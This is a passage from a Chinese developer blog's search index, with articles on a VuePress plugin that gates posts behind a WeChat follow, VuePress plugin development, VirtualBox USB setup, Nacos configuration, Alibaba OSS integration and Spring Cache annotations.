- name String 是 无 - keyword String 是 无 - qrcode String 是 无 - selector String 否 div.theme-default-content - libUrl String 否 https://qiniu.techgrow.cn/readmore/dist/readmore.js - cssUrl String 否 https://qiniu.techgrow.cn/readmore/dist/vuepress.css - excludes Json Object 否 { strExp: [ ], regExp: [ ] } - reverse Boolean 否 false - height String / Number 否 auto - expires Number 否 365 - interval Number 否 60 - random Number 否 1 - selector 参数的作用是指定 JS 选择器来获取文章的主体内容，若 VuePress 使用了第三方主题，则一般需要根据第三方主题来配置该参数，否则可能会导致引流工具无法生效。其中 VuePress 不同主题的配置示例如下： 主题 插件配置 备注 @vuepress/theme-vue selector: 'div.theme-default-content' 官方默认主题 vuepress-theme-reco selector: 'div.theme-reco-content' 第三方主题 vuepress-theme-hope selector: 'div.theme-hope-content' 第三方主题 vuepress-theme-vdoing selector: 'div.theme-vdoing-content' 第三方主题 提示 若不清楚如何指定 JS 选择器，则可以打开博客的任意一篇文章，利用 Chrome 等浏览器的元素审查功能，找到文章页面中文章主体的 div 标签，最后定位得到 div 标签的 CSS 类即可（例如 theme-default-content），点击查看详细的操作图解。 验证插件效果打开文章页面，若文章自动隐藏了部分内容，并且出现了 阅读全文 按钮，则说明导流插件正常运行，如下图所示： 点击 阅读全文 按钮，会弹出微信公众号的二维码窗口，如下图所示： 取消阅读限制若希望关闭部分文章的微信公众号导流功能，可以使用插件的 excludes 参数来实现。值得一提的是，excludes 的参数值是一个 JSON 对象，其中的 strExp 属性是路径和通配符规则的字符串数组，而 regExp 属性是正则表达式的字符串数组。 根据 URL 路径，关闭某篇文章的导流功能 12345678module.exports = { plugins: [ ['vuepress-plugin-readmore-popular', { // 排除 URL 为 `/fontend/webpack` 的文章 excludes: { strExp: ['/fontend/webpack'] }, }] ]} 根据 URL 通配符，关闭某个目录下的所有文章的导流功能 123456789module.exports = { plugins: [ ['vuepress-plugin-readmore-popular', { // 排除 URL 以 `/fontend` 开头的文章 // 排除 URL 为 `/backend/python/io` 的文章 excludes: { strExp: ['/fontend/*', '/backend/*/io'] }, }] ]} 根据 URL 正则表达式，关闭符合规则的所有文章的导流功能 12345678module.exports = { plugins: [ ['vuepress-plugin-readmore-popular', { // 排除 URL 不以 `/fontend` 开头的文章 excludes: { regExp: ['^(?!\\/fontend).*'] }, }] ]} 混合使用 1234567module.exports = { plugins: [ ['vuepress-plugin-readmore-popular', { excludes: { strExp: ['/webpack', '/fontend/*', '/backend/*/io'], regExp: ['^(?!\\/php).*'] }, }] ]} 提示 文章 URL 优先匹配 strExp 规则，然后再匹配 regExp 规则 文章 URL 一旦满足 strExp 规则，则不会再匹配 regExp 规则 如果希望符合 URL 排除规则的文章才添加导流工具，则可以使用 reverse : true 配置参数实现 自定义样式插件默认使用了定义在 vuepress.css 的 CSS 样式，你可以使用以下两种方式自定义自己的样式： 第一种方式：更改博客主题的 CSS 源码文件，将自定义的那部分 CSS 样式添加到里面 第二种方式：根据 vuepress.css 创建自己的 CSS 文件（完整的），并将其存放在自己的博客里，同时通过插件的 cssUrl 配置参数来指定其访问的 URL 路径 提示：为了方便日后维护，强烈建议使用第二种方式来添加自定义样式 常见问题问题一 VuePress 安装插件后，引流工具无法生效。 若引流工具无法生效，此时需要留意 VuePress 使用的是不是第三方主题。在使用第三方主题的情况下，一般需要根据第三方主题来配置插件的 selector 参数，该参数的作用是指定 JS 选择器来获取文章的主体内容，详细说明请看这里。 值得一提的是，若由于 selector 参数配置不正确导致引流工具无效，那么引流工具会在浏览器的控制台输出如下的警告信息： 问题二 VuePress 安装插件后，浏览器的控制台输出警告或者错误信息，且引流工具无法生效 浏览器访问 VuePress 博客后，按下 F12 快捷键调出调试工具，然后切换到 控制台，最后将警告或者错误信息截图，并发送到 官方微信群，建议留言备注 VuePress 与 VuePress 主题的版本号。 问题三 VuePress 安装插件后，移动端的引流工具无法生效，而 PC 端却生效 考虑到用户体验的问题，在移动端默认是关闭引流功能的，请知悉。 在线演示 官方 Demo 官方微信群",tags:"静态博客"},{title:"VuePress 插件开发",url:"/posts/2f4cff19.html",text:'前言博主已开发的插件 vuepress-plugin-baidu-seo | VuePress v1 百度 SEO 插件 vuepress-plugin-baidu-seo-next | VuePress v2 百度 SEO 插件 vuepress-plugin-readmore-popular | VuePress v1 公众号引流插件 vuepress-plugin-readmore-popular-next | VuePress v2 公众号引流插件 VuePress 官方插件VuePress v1.x VuePress v1.x 官方中文文档 VuePress v1.x 官方插件的代码仓库 VuePress v2.x VuePress v2.x 官方中文文档 VuePress v2.x 官方插件的代码仓库 VuePress v1 插件开发Vue 组件引入内部 JS 文件第一步：在项目内定义 JS 文件，例如这里定义 loadResources.js 文件，同时通过 export 暴露 JS 函数： 123456789101112131415161718192021222324252627282930313233343536// 引入Qconst Q = require(\'q\');/** * 异步加载js文件 * * @param url 导入js的url地址 * @param id script标签的id（必须唯一） * @returns {*} export此函数方便全局调用 */export function asyncLoadJs(url, id) { return Q.Promise((resovle, reject) =&gt; { let srcArr = document.getElementsByTagName(\'script\'); let hasLoaded = false; for (let i = 0; i &lt; srcArr.length; i++) { hasLoaded = srcArr[i].id === id; if (hasLoaded) { document.getElementById(id).remove(); } } let script = document.createElement(\'script\'); script.type = \'text/javascript\'; script.src = url; script.id = id; document.body.appendChild(script); script.onload = () =&gt; { resovle(); }; script.onerror = () =&gt; { reject(); } })} 第二步：在项目里定义 Vue 组件，例如这里定义 example.vue，同时通过 import 引入上面定义的 JS 文件即可： 12345678910111213141516171819&lt;template&gt; &lt;div&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;import { asyncLoadJs } from "../js/loadResources.js";export default { name: "example", data() { return {}; }, mounted() { asyncLoadJs("https://www.example/js/example.js", "example"); },};&lt;/script&gt;&lt;style lang="scss" scoped&gt;&lt;/style&gt; 参考资料 从零实现一个 VuePress 插件 VuePress 博客优化之拓展 Markdown 语法 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客 前端"},{title:"VirtualBox 常见使用问题解决",url:"/posts/729d1230.html",text:'Win10 虚拟机无法识别 USB 设备根据 VirtualBox 的版本号，在 VirtualBox 官网 下载对应版本的一个叫 Oracle_VM_VirtualBox_Extension_Pack 的扩展，扩展包的版本号必须与 VirtualBox 的版本号一致 然后使用以下 Linux 命令将扩展包安装到 VirtualBox 中，这里需要提前将以前安装过的扩展包手动删除掉，否则会提示扩展包安装失败 1$ sudo VBoxManage extpack install Oracle_VM_VirtualBox_Extension_Pack-6.1.38-153438.vbox-extpack 安装完后可以在 VirtualBox 的全局设定界面看到对应的扩展包 打开 VirtualBox 的 Win10 虚拟机设置界面，开启 USB 3.0 Controller 最后插入 USB 设备，等宿主机挂载 USB 设备后启动 Win10 虚拟机，接着在虚拟机菜单栏中的 Devices -&gt; USB 中勾选对应的 USB 设备，即可让 Win10 虚拟机识别到 USB 设备了 参考博客 VirtualBox 虚拟机读取 U 盘 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"SpringCloud 开发随笔",url:"/posts/b9ecd4c2.html",text:'配置中心Nacos 配置中心Maven 引入 Nacos Config 不生效错误日志信息Spring Cloud 项目引入 Nacos Config 的 Maven 依赖后，使用 @Value 注解无法读取 Nacos 配置中心的内容，抛出的异常信息如下 1Caused by: java.lang.IllegalArgumentException: Could not resolve placeholder \'common.name\' in value "${common.name}" 第一种错误原因Spring Cloud 无法读取项目中的 bootstrap.yml 配置文件，此时需要额外引入 spring-cloud-starter-bootstrap 依赖来解决 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-bootstrap&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;&lt;/dependency&gt; 第二种错误原因项目中 bootstrap.yml 配置文件的内容有误，导致 Nacos Config Spring Cloud 无法通过正确的 dataId 去 Nacos 配置中心获取对应的配置信息，正确的配置示例如下所示： 123456789101112131415server: port: 8080spring: application: name: seamall-coupon profiles: active: dev cloud: nacos: config: server-addr: 127.0.0.1:8848 # 配置中心的地址 namespace: 73975db4-5c7f-4fef-9ea9-36492bd59f45 # 命名空间 group: TEST_GROUP # 配置分组 file-extension: yaml # 由于当前环境对应的 profile 为 dev，因此这里完整的 dataId 就是 seamall-coupon-dev.yaml 上述 bootstrap.yml 配置文件对应的 Nacos Config 配置内容如下图所示 上述 bootstrap.yml 配置文件的详细说明如下 在 bootstrap.yaml 配置文件中，需要配置 spring.application.name，因为它是构成 Nacos Config 配置管理 dataId 字段的一部分。值得一提的是，在 Nacos Config Spring Cloud 中，dataId 的完整格式如下： 1${prefix}-${spring.profiles.active}.${file-extension} prefix 默认为 spring.application.name 的值，也可以通过配置项 spring.cloud.nacos.config.prefix 来配置 file-exetension 为配置内容的数据格式，可以通过配置项 spring.cloud.nacos.config.file-extension 来配置，目前只支持 properties 和 yaml 类型 spring.profiles.active 即为当前环境对应的 profile。特别注意：当 spring.profiles.active 为空时，对应的连接符 - 也将不存在，dataId 的拼接格式会变成 ${prefix}.${file-extension} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务 开发随笔"},{title:"Spring Boot 集成 Alibaba OSS",url:"/posts/e4db4080.html",text:'前言本文主要介绍 Spring Boot 项目如何集成 Alibaba 的 OSS 服务（对象存储），教程内容同样适用于 Spring Cloud 项目。 提示 1、Spring Cloud 项目不建议继续使用 spring-cloud-starter-alicloud-oss 组件，尤其是较新版本的 Spring Cloud（例如 2021.0.1 版本），毕竟 Alibaba OSS 的官方文档也移除了该组件的使用说明。 2、Alibaba OSS 更多的使用教程请查看 官方文档。 版本说明 Spring Boot Spring Boot Alibaba 2.6.3 1.0.0 Maven 依赖1234567891011121314151617181920212223242526&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;aliyun-oss-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;dependencyManagement&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;2.6.3&lt;/version&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;type&gt;pom&lt;/type&gt; &lt;/dependency&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;aliyun-spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;type&gt;pom&lt;/type&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt; YAML 配置内容在 Spring Boot 的 application.yml 文件中配置 Alibaba OSS 的 accessKeyId、secretAccessKey、endpoint 123456alibaba: cloud: access-key: *** secret-key: *** oss: endpoint: *** Java 测试代码运行下述代码之前，记得将 BUCKET_NAME 更改为你自己的存储桶的名称。 1234567891011121314151617181920212223242526272829303132333435import com.aliyun.oss.OSSClient;import org.junit.jupiter.api.Test;import org.springframework.boot.test.context.SpringBootTest;import javax.annotation.Resource;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.InputStream;@SpringBootTestpublic class OssTest { /** * Bucket */ private static final String BUCKET_NAME = "your-bucket"; @Resource private OSSClient ossClient; /** * 上传文件 */ @Test public void uploadFile() throws FileNotFoundException { // 文件名称 String objectName = "upload.jpg"; // 文件路径 String filePath = "/tmp/images/upload.jpg"; // 文件上传 InputStream inputStream = new FileInputStream(filePath); ossClient.putObject(BUCKET_NAME, objectName, inputStream); } } var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Spring Cache 使用教程之二",url:"/posts/a843c693.html",text:'大纲 Spring Cache 使用教程之一 Spring Cache 使用教程之二 前言官方文档 Spring Cache 官方文档 使用 @Cacheable 注解@Cacheable 可以将方法运行的结果进行缓存，在缓存时效内再次调用该方法时不会调用方法本身，而是直接从缓存获取结果并返回给调用方。 属性介绍 属性名 描述 value / cacheNames 指定缓存的名称，Spring Cache 使用 CacheManage 管理多个缓存组件 Cache，这里的 Cache 组件就是根据该名称进行区分的，它负责对缓存执行真正的 CRUD 操作 key 缓存数据时 Key 的值，默认是使用方法参数的值，可以使用 SpEL 表达式计算 Key 的值 keyGenerator 缓存 Key 的生成策略，它和 key 属性互斥使用（只能二选一） cacheManager 指定缓存管理器（如 ConcurrentHashMap、Redis 等） cacheResolver 作用和 cacheManager 属性一样，两者只能二选一 condition 指定缓存的条件（满足什么条件才缓存），可用 SpELl 表达式（如 #id&gt;0，表示当入参 id 大于 0 时才缓存） unless 否定缓存，即满足 unless 指定的条件时，方法的结果不进行缓存，使用 unless 时可以在调用的方法获取到结果之后再进行判断（如 #result == null，表示如果结果为 null 时不缓存） sync 是否使用异步模式进行缓存，默认值是 false 在一个多线程的环境中，某些操作可能会被相同的参数并发地调用，同一个 value 值可能被多次计算（或多次访问数据库），这样就达不到缓存的目的。针对这些可能高并发的操作，可以使用 sync 属性来告诉底层的缓存提供者将缓存的入口锁住，这样在同一时刻就只能有一个线程计算操作的结果值，而其它线程则需要等待。当 sync 的值为 true 时，相当于同步操作，可以有效地避免出现缓存击穿的问题，关于缓存击穿的介绍可以点击 这里。 特别注意 1、即满足 condition 又满足 unless 条件的情况下，不会缓存数据 2、使用异步模式（sync=true）进行缓存时，unless 条件将不会生效 3、condition 不指定相当于 true，而 unless 不指定相当于 false 4、condition 属性使用的 SpEL 表达式只有 #root 和获取方法参数类的 SpEL 表达式，不能使用带返回结果的表达式（如 #result），因此 condition = "#result != null" 会导致所有对象都不写入缓存，每次都要查询数据库。 使用案例1234@Cacheable(value="users", key="#id")public User find(Integer id) { return null;} 指定 Key@Cacheable 注解有一个属性 key 可以用于直接定义缓存 Key，该属性不是必填项。如果为空，则会使用默认的 Key 生成器进行生成。默认的 Key 生成器要求方法参数具有有效的 hashCode() 和 equals() 方法实现。值得一提的是，key 属性的值支持使用 SpEL 表达式。使用方法参数作为 Key 时，可以直接使用 #参数名 或者 #p参数索引 的 SpEL 表达式来引用，以下的写法都是合法的。 12345678910111213141516171819@Cacheable(value="users", key="#id")public User find(Integer id) { return null;}@Cacheable(value="users", key="#p0")public User find(Integer id) { return null;}@Cacheable(value="users", key="#user.id")public User find(User user) { return null;}@Cacheable(value="users", key="#p0.id")public User find(User user) { return null;} 使用 @CachePut 注解与 @Cacheable 注解不同的是使用 @CachePut 注解标注的方法，在执行前不会去检查缓存中是否存在之前执行过的结果，而是每次都会执行该方法，并将执行结果以键值对的形式写入指定的缓存中。@CachePut 注解一般用于更新缓存数据，相当于缓存使用的是写模式中的双写模式。 属性介绍@CachePut 注解所具有的属性与 @Cacheable 注解相同，这里不再累述。 使用案例12345@CachePut(value = "users", key="#user.id")public User updateUser(User user) { userMapper.updateUser(user); return user;} 使用 @CacheEvict 注解标注了 @CacheEvict 注解的方法在被调用时，会从缓存中移除已存储的数据。@CacheEvict 注解一般用于删除缓存数据，相当于缓存使用的是写模式中的失效模式。 属性介绍 属性名 描述 value / cacheNames 缓存的名称 key 缓存的键 allEntries 是否根据缓存名称清空所有缓存数据，默认值为 false，当值指定为 true 时，Spring Cache 将忽略注解上指定的 key 属性 beforeInvocation 是否在方法执行之前就清空缓存，默认值为 false 清除缓存的操作默认是在对应方法成功执行之后才触发的，即方法的执行如果因为抛出异常而未能成功返回时也不会触发清除操作。使用 beforeInvocation 属性可以改变触发清除操作执行的时机，当指定该属性的值为 true 时，Spring 会在调用该方法之前清除缓存中的数据。值得一提的是，在方法调用之前还是之后清除缓存的区别在于方法调用时是否会出现异常，若不出现异常，这两者之间没有区别，若出现异常，设置为在方法调用之后清除缓存将不起作用，因为方法调用失败了。 使用案例1234@CacheEvict(value = "users", key = "#id")public void deleteUserById(Long id) { userMapper.deleteUserById(id);} 使用 @Caching 注解@Caching 注解用于在一个方法或者类上，同时指定多个 Spring Cache 相关的注解。 属性介绍 属性名 描述 cacheable 用于指定 @Cacheable 注解 put 用于指定 @CachePut 注解 evict 用于指定 @@CacheEvict 注解 使用案例12345678@Caching(cacheable = {@Cacheable(value = "stu", key = "#userName")}, put = { @CachePut(value = "stu", key = "#result.id"), @CachePut(value = "stu", key = "#result.age")})public Student getStuByUserName(String userName) { StudentExample studentExample = new StudentExample(); studentExample.createCriteria().andUserNameEqualTo(userName); List&lt;Student&gt; students = studentMapper.selectByExample(studentExample); return Optional.ofNullable(students).orElse(null).get(0);} 使用 @CacheConfig 注解@CacheConfig 注解标注在类上，用于抽取 Spring Cache 相关注解的公共配置，可抽取的公共配置包括缓存名称、主键生成器、缓存管理器。比如，在每个 Spring Cache 缓存注解中，往往都指定了缓存名称（value = "stu" 或者 cacheNames = "stu"）。此时 @CacheConfig 注解可以将它抽离出来，并在整个类上添加 @CacheConfig(value = "stu") 注解之后，每个方法默认都会使用指定的缓存名称 stu。 属性介绍 属性名 描述 value / cacheNames 指定缓存的名称，Spring Cache 使用 CacheManage 管理多个缓存组件 Cache，这里的 Cache 组件就是根据该名称进行区分的，它负责对缓存执行真正的 CRUD 操作 cacheManager 缓存管理器 keyGenerator 主键生成器 使用案例123456789101112131415161718192021@Service@CacheConfig(value = "stu")public class StudentServiceImpl implements StudentService { @Resource private StudentMapper studentMapper; @Override @CachePut(key = "#result.id") public Student updateStu(Student student){ studentMapper.updateByPrimaryKey(student); return student; } @Override @CacheEvict(key = "#id") public void delSut(Integer id) { studentMapper.deleteByPrimaryKey(id); }} 使用 SpEL 表达式SpEL 表达式的语法 Spring Cache 也提供了 root 对象，可以在 SpEL 表达式中直接使用 名称 位置 描述 示例 methodName 根对象 要调用的方法的名称 #root.methodName method 根对象 正在调用的方法 #root.method.name target 根对象 正在调用的目标对象 #root.target targetClass 根对象 要调用的目标的类 #root.targetClass args 根对象 用于调用目标的参数（作为数组） #root.args[0] caches 根对象 正在调用的方法使用的缓存列表（如 @Cacheable(value={"cache1", "cache2"}))，则有两个缓存） #root.caches[0].name argument name 评估背景 方法参数名，可以直接使用 #参数名，也可以使用 #p0 或 #a0 的形式，0 代表参数的索引 #iban、#a0、#p0 result 评估背景 方法执行后的返回值，仅当方法执行之后的判断有效，如 unless、cache put、cache evict (当 beforeInvocation = false) 的表达式 #result SpEL 表达式的使用案例123456789@Cacheable(value="users", key="#p0.id")public User find(User user) { return null;}@Cacheable(value="users", key="#root.method.name")public User find(User user) { return null;} 当需要使用 root 对象的属性作为 Key 时，还可以将 #root 省略掉，因为 Spring Cache 默认使用的就是 root 对象的属性 1234@Cacheable(value={"users", "members"}, key="caches[0].name")public User find(User user) { return null;} 当需要调用目前类里的方法动态生成 Key 时，在 SpEL 表达式内拼接字符串时，必须使用单引号将字符串包裹起来 123456789101112@Cacheable(value="users", key="#root.target.getDictTableName() + \'_\' + #root.target.getFieldName()")public User find(User user) { return null;}public String getDictTableName(){ return "";}public String getFieldName(){ return "";} 自定义缓存配置防止缓存穿透为了避免出现缓存穿透，建议让 Spring Cache 将空值也写入缓存，关于缓存穿透的介绍可以点击 这里。 123456spring: cache: type: redis redis: # 是否缓存空值，防止缓存穿透 cache-null-values: true 指定有效时间指定缓存数据的有效时间，这样可以让缓存数据过期被删除后，触发主动更新（基于缓存的读模式）。 123456spring: cache: type: redis redis: # 有效时间，单位为毫秒 time-to-live: 3600000 提示 Spring Cache 的注解不支持给缓存单独设置不同的有效时间，若希望像 Redis 一样设置缓存的有效时间，可以参考这篇 博客。 指定 Key 前缀在不指定 Key 前缀时，Spring Cache 默认会使用缓存的名称作为 Key 前缀。 12345678spring: cache: type: redis redis: # Key 的前缀，建议不配置，让它默认使用缓存的名称作为前缀 key-prefix: CACHE_ # 是否使用前缀 use-key-prefix: true 指定 Key 生成器缓存的本质就是键值对存储模式，每一次方法的调用都需要生成相应的 Key，这样才能操作缓存。若没有给 Spring Cache 的注解（如 @Cacheable）设置属性 key，缓存抽象默认会使用 SimpleKeyGenerator 来自动生成 Key，具体源码如下： 如果没有方法参数，则直接返回 SimpleKey.EMPTY 如果只有一个方法参数，则直接返回该方法参数 若有多个方法参数，则返回包含多个方法参数的 SimpleKey 对象 Spring Cache 也考虑到需要自定义 Key 的生成方式，只需要实现 org.springframework.cache.interceptor.KeyGenerator 接口，然后通过 @Cacheable 注解的 keyGenerator 属性指定 Key 生成器即可。值得一提的是，默认的 Key 生成器要求方法参数具有有效的 hashCode() 和 equals() 方法实现。 123456789101112/*** 自定义 Key 生成器*/@Componentpublic class CustomKeyGenerator implements KeyGenerator { public Object generate(Object target, Method method, Object... params) { String key = target.toString() + ":" + method.getName() + ":" + Arrays.toString(params); return key; }} 1234567/*** 指定自定义的 Key 生成器*/@Cacheable(value="users", keyGenerator="customKeyGenerator")public User find(User user) { return null;} 指定序列化机制默认情况下，Spring Cache 会使用 JDK 的序列化机制将缓存数据写入 Redis，这样存储在 Redis 里面的就是二进制数据。若希望 Spring Cache 将数据序列化成 JSON 数据再写入 Redis，可以使用以下的配置类。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import org.springframework.boot.autoconfigure.cache.CacheProperties;import org.springframework.boot.context.properties.EnableConfigurationProperties;import org.springframework.cache.annotation.CachingConfigurerSupport;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.data.redis.cache.RedisCacheConfiguration;import org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer;import org.springframework.data.redis.serializer.RedisSerializationContext;import org.springframework.data.redis.serializer.StringRedisSerializer;import java.time.Duration;@Configuration@EnableCaching@EnableConfigurationProperties(CacheProperties.class)public class SpringCacheConfig extends CachingConfigurerSupport { /** * Spring Cache 的 Redis 配置 */ @Bean public RedisCacheConfiguration redisCacheConfiguration(CacheProperties cacheProperties) { // 默认配置 RedisCacheConfiguration config = RedisCacheConfiguration.defaultCacheConfig(); // 设置随机的有效时间，若不设置，默认是永久有效 // Random random = new Random(); // config = config.entryTtl(Duration.ofHours(random.nextInt(24))); // Key的序列化机制 config = config.serializeKeysWith(RedisSerializationContext.SerializationPair.fromSerializer(new StringRedisSerializer())); // Value的序列化机制 config = config.serializeValuesWith(RedisSerializationContext.SerializationPair.fromSerializer(new GenericJackson2JsonRedisSerializer())); // 加载配置文件的内容 CacheProperties.Redis redisProperties = cacheProperties.getRedis(); if (redisProperties.getTimeToLive() != null) { config = config.entryTtl(redisProperties.getTimeToLive()); } if (redisProperties.getKeyPrefix() != null) { config = config.prefixCacheNameWith(redisProperties.getKeyPrefix()); } if (!redisProperties.isCacheNullValues()) { config = config.disableCachingNullValues(); } if (!redisProperties.isUseKeyPrefix()) { config = config.disableKeyPrefix(); } return config; }} Spring Cache 加载 Redis 缓存配置的流程 CacheAutoConfiguration --&gt; RedisCacheConfiguration --&gt; 自动配置了 RedisCacheManager --&gt; 初始化所有缓存 --&gt; 每个缓存决定使用什么配置内容 --&gt; 如果 RedisCacheConfiguration 有就用已经有的，没有就用默认的 Redis 配置 所以如果想自定义 Redis 缓存配置，只需要在 Spring 容器中放一个 RedisCacheConfiguration，它就会应用到当前 RedisCacheManager 管理的所有缓存分区中 常见问题总结缓存不生效在有些情形下，Spring Cache 注解式缓存是不起作用的。比如在同一个 Bean 里的内部方法调用，又或者是子类调用父类中有缓存注解的方法等。后者不起作用是因为缓存切面必须走代理才有效，这时候可以手动使用 CacheManager 来获得缓存效果。 Spring Cache 的不足 读模式 读模式下，可能会出现缓存失效的问题，Spring Cache 的解决方案如下 缓存穿透：查询一个不存在的数据（Null），解决方案是缓存空数据，配置内容是 cache-null-values: true 缓存雪崩：大量缓存同时过期，解决方案是给缓存设置过期时间（或者是随机的过期时间），配置内容是 time-to-live: 3600000 缓存击穿：大量并发请求进来同时查询一个正好过期的数据，解决方案是使用 @Cacheable(sync = true) 来实现同步模式的缓存写入，底层是基于 JDK 的 synchronized 写模式 双写模式或者失效模式下，可能会出现缓存数据一致性问题（读取到脏数据），Spring Cache 暂时没办法解决，其他的解决方案如下 加分布式锁（读写锁），只适用于读多写少的业务场景 直接查询数据库，不再从缓存获取数据，只适用于读多写多的业务场景 使用 Canal 中间件，实时将数据库的数据更新到缓存，会增加系统的复杂性 总结 常规数据（读多写少、即时性与一致性要求不高的数据）完全可以使用 Spring Cache，至于写模式下缓存数据一致性问题的解决，只要缓存数据有设置过期时间就足够了 特殊数据（读多写多、即时性与一致性要求非常高的数据），不能使用 Spring Cache，建议考虑特殊的设计（例如使用 Cancal 中间件等） 提示 更多关于缓存写模式、缓存失效、缓存数据一致性、分布式锁的介绍，请点击 这里。 参考博客 Spring Cache 详解 Spring Cache 基础使用 JSR-107 与 Spring Boot 缓存 Spring Boot 中 Cache 缓存的介绍和使用 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 缓存"},{title:"Spring Cache 使用教程之一",url:"/posts/e792e01b.html",text:'大纲 Spring Cache 使用教程之一 Spring Cache 使用教程之二 前言官方文档 Spring Cache 官方文档 简单介绍Spring Cache 是 Spring 提供的一个缓存框架，从 Spring 3.1 版本开始支持将缓存添加到现有的 Spring 应用程序中，从 Spring 在 4.1 版本开始，缓存已支持 JSR-107 注释和更多自定义的选项。Spring Cache 利用了 AOP，实现了基于注解的缓存功能，并且进行了合理的抽象，业务代码不用关心底层是使用了什么缓存框架，只需要简单地加一个注解就能实现缓存功能，做到了较小的代码侵入性。由于市面上的缓存工具实在太多，Spring Cache 框架还提供了 CacheManager 接口，可以实现降低对各种缓存框架的耦合；它不是具体的缓存实现，只是提供一整套的接口和代码规范、配置、注解等，用于整合各种缓存方案，比如 Ehcache、Caffeine、Hazelcast、Couchbase 等。 JSR-107 规范JSR 是 Java Specification Requests（Java 规范请求）的缩写。JSR-107 是关于如何使用缓存的规范，是 Java 提供的一个接口规范，类似 JDBC 规范，没有具体的实现。Java Caching（JSR-107）定义了 5 个核心接口，分别是 CachingProvider、CacheManager、Cache、Entry 、Expiry。 CachingProvider（缓存提供者）：用于创建、配置、获取、管理和控制多个 CacheManager。 CacheManager（缓存管理器）：用于创建、配置、获取、管理和控制多个唯一命名的 Cache，一个 CacheManager 仅对应一个 CachingProvider。 Cache（缓存）：存在于 CacheManager 的上下文中，是一个类似 Map 的数据结构，并临时存储以 Key 为索引的值。一个 Cache 仅被一个 CacheManager 所拥有，由 CacheManager 管理其生命周期。 Entry（缓存键值对）：是一个存储在 Cache 中的键值对。 Expiry（缓存时效）：每一个存储在 Cache 